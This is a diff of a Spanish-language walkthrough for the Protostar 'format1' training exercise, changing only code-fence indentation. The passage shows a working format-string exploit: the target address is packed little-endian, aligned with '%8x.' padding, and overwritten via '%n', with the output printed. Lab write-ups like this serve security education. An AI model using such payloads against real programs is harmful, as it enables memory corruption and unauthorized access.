@@ -126,24 +126,24 @@ Como podemos ver la segunda entrada de la pila es nuestro "0x0804960c" que se im
 ```
   La direccion de la variable "target" es *0x08049638* que si lo pasamos a endian (dar la vuelta a los bytes) sale -> *\x38\x96\x04\x08*
   Ahora sustituimos las "AAAA" por esa dirección (ambas cosas ocupan 4 bytes).
-  	```console
-	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
-	AAAABBBB 804960c
-    	bffff488
-    	...
-    	317461
-    	8049638
-    	```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
+AAAABBBB 804960c
+bffff488
+...
+317461
+8049638
+```
   Perfecto, la dirección de memoria se ha alineado perfectamente. Ahora hay que sobrrescribirla cambiando la "%x" por "%n"
   
-  	```console
-	[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
-	AAAABBBB 804960c
-    	bffff488
-    	...
-    	317461
-    	you have modified the target :)
-    	```
+```console
+[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
+AAAABBBB 804960c
+bffff488
+...
+317461
+you have modified the target :)
+```
   Y ya está, primer format completado.
 
   
